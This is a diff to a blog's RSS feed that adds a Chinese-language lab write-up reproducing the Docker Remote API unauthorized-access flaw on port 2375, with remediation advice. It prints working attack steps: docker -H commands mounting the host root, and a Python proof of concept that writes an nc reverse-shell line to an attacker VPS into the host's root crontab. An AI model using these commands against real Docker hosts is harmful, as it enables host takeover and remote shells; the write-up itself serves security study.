@@ -6,9 +6,87 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>This is a customized copyright.</copyright>
-    <lastBuildDate>Tue, 07 Jul 2020 23:35:20 +0800</lastBuildDate>
+    <lastBuildDate>Wed, 08 Jul 2020 23:55:11 +0800</lastBuildDate>
     
         <atom:link href="https://b40du.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+        <item>
+        <title>Docker Daemon Api 未授权访问漏洞复现</title>
+        <link>https://b40du.github.io/posts/reproduce-web-docker-daemon-api/</link>
+        <pubDate>Wed, 08 Jul 2020 23:55:11 +0800</pubDate>
+        
+        <guid>https://b40du.github.io/posts/reproduce-web-docker-daemon-api/</guid>
+        <description>爆肚的杂货铺 https://b40du.github.io/posts/reproduce-web-docker-daemon-api/ -&lt;h1 id=&#34;1-漏洞描述&#34;&gt;1. 漏洞描述&lt;/h1&gt;
+&lt;p&gt;Docker是一种开源的应用容器引擎，由于权限设置不当以及端口暴露在外网等原因，可以利用该漏洞访问Docker对外开放的一个API接口，进行远程命令执行。&lt;/p&gt;
+&lt;h1 id=&#34;2-漏洞成因&#34;&gt;2. 漏洞成因&lt;/h1&gt;
+&lt;p&gt;Docker在使用集群管理（如：Kubernetes，swarm）时，要使用&lt;code&gt;remote api&lt;/code&gt;对节点进行管理，&lt;code&gt;remote api&lt;/code&gt;无认证时的默认端口是2375（需要TLS认证默认登录是2376）。&lt;/p&gt;
+&lt;p&gt;而&lt;code&gt;remote api&lt;/code&gt;默认是可以不需要认证能直接访问，能直接对Docker进行操作，如新建容器，删除容器，查看镜像容器信息等等。&lt;/p&gt;
+&lt;h1 id=&#34;3-漏洞复现&#34;&gt;3. 漏洞复现&lt;/h1&gt;
+&lt;h2 id=&#34;31-进入vulhub漏洞目录启动漏洞环境&#34;&gt;3.1 进入vulhub漏洞目录，启动漏洞环境&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200711190924.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200711191010.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;32-探测2375端口&#34;&gt;3.2 探测2375端口&lt;/h2&gt;
+&lt;p&gt;如果是公网的其他主机，我们需要探测2375端口。&lt;/p&gt;
+&lt;p&gt;由于是靶场搭建漏洞环境，在这里我们直接访问&lt;code&gt;http://youer-vps-ip:2375/version&lt;/code&gt;请求，如果返回包带有&lt;code&gt;json&lt;/code&gt;格式，说明存在该漏洞。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708144642.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;33-利用漏洞查看镜像创造容器&#34;&gt;3.3 利用漏洞查看镜像、创造容器&lt;/h2&gt;
+&lt;p&gt;在远程&lt;code&gt;vps&lt;/code&gt;中，构造如下&lt;code&gt;poc&lt;/code&gt;，进行测试：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker -H&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;tcp://your-vps-ip:2375 images
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708195346.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后我们新建一个容器，并将&lt;code&gt;entrypoint&lt;/code&gt;设置为&lt;code&gt;/bin/bash&lt;/code&gt;或者&lt;code&gt;/bin/sh&lt;/code&gt;，挂载点设置为服务器的根目录挂载至&lt;code&gt;/tmp&lt;/code&gt;目录下，然后使用&lt;code&gt;ls&lt;/code&gt;命令查看。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker -H&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;tcp://your-vps-ip:2375 run -it -v /:/tmp --entrypoint /bin/sh alpine:latest
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708195528.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后使用命令查看所有的容器。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker -H&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;tcp://your-vps-ip:2375 ps -a
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708195642.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;34-利用漏洞反弹shell&#34;&gt;3.4 利用漏洞反弹shell&lt;/h2&gt;
+&lt;p&gt;我们启动一个容器，并将宿主机的&lt;code&gt;/etc&lt;/code&gt;目录挂载到容器中，这个时候我们便已经可以任意读写文件了。接下来我们需要做的就是将命令写入&lt;code&gt;crontab&lt;/code&gt;配置文件，进行反弹&lt;code&gt;shell&lt;/code&gt;。于是在自己的&lt;code&gt;vps&lt;/code&gt;上构造如下&lt;code&gt;poc&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; docker
+
+client &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; docker&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DockerClient(base_url&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://靶场ip:2375/&amp;#39;&lt;/span&gt;)
+data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;containers&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;alpine:latest&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;sh -c &amp;#34;echo &amp;#39;*/1 * * * * /usr/bin/nc your-vps-ip 7890 -e /bin/sh&amp;#39; &amp;gt;&amp;gt; /tmp/etc/crontabs/root&amp;#34; &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;True, volumes&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/etc&amp;#39;&lt;/span&gt;: {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bind&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/tmp/etc&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mode&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rw&amp;#39;&lt;/span&gt;}})
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后同时另外开启一个控制台，使用&lt;code&gt;nc&lt;/code&gt;监听&lt;code&gt;7890&lt;/code&gt;端口：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;nc -nvvl &lt;span style=&#34;color:#ae81ff&#34;&gt;7890&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708200245.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后运行&lt;code&gt;python&lt;/code&gt;脚本，监听到靶场ip连接：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708200432.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后输入命令&lt;code&gt;id&lt;/code&gt;：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708200558.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;成功！&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在这里有个问题就是，poc并不是一成不变的，要根据实际情况进行调整，有的时候是bash有的时候是sh。&lt;/p&gt;
+&lt;p&gt;另外就是，跟阿杜老师交流的过程中进行了多次复现，又遇到了复现不成功的情况，经过和阿杜老师的交流，发现环境可能有些问题，计划任务不一定可以正常执行，需要先crontab -e 编辑一下，保存退出，然后计划任务就可以被激活。&lt;/p&gt;
+&lt;p&gt;由于这部分内容尚未深入研究，待有时间对其再次做一些测试。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;4-漏洞危害&#34;&gt;4. 漏洞危害&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;可利用此漏洞，远程命令执行，且很可能逃逸至宿主机&lt;/li&gt;
+&lt;li&gt;可利用此漏洞，进行&lt;code&gt;crontabs&lt;/code&gt;反弹&lt;code&gt;shell&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;5-漏洞修复&#34;&gt;5. 漏洞修复&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;增加TLS认证（比较复杂）&lt;/li&gt;
+&lt;li&gt;在防火墙上配置禁止外网访问&lt;code&gt;2375&lt;/code&gt;端口&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;6-参考资料&#34;&gt;6. 参考资料&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Docker Daemon Api 未授权访问漏洞&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/43d86d7ed3a5&#34;&gt;https://www.jianshu.com/p/43d86d7ed3a5&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Docker Remote API 未授权访问&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;[https://mature-sec.com/post/docker-remote-api-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/](&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+- https://b40du.github.io/posts/reproduce-web-docker-daemon-api/ - This is a customized copyright.</description>
+        </item>
     
     
     
